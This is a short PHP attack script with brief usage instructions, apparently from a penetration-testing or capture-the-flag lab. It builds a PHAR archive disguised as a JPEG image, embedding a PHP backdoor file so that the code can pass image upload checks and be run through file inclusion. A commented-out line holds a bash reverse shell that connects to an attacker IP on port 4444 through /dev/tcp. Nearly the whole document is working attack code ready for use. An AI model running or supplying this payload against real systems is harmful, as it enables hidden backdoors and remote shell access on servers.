Call with 

<pre>
php -d phar.readonly=0 php-rfi-smuggling.php
</pre>

or set the following in `/etc/php/8.2/cli/php.ini'

<pre>
phar.readonly = 0
</pre>

<?php
/* $attacker_ip='10.10.14.97'; */
/* $attacker_port='4444'; */
$php_inject_script="./php-backdoor.php";
$jpeg_artifact="./avatar.jpg";

$phar = new Phar('attack.phar');
$phar->startBuffering();
/* $shell = "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/" . $attacker_ip . "/" . $attacker_port . " 0>&1\"'); ?>"; */
$shell = file_get_contents($php_inject_script);
$jpeg = file_get_contents($jpeg_artifact);
$phar->addFromString('attack.php', $shell);
$phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$phar->stopBuffering();
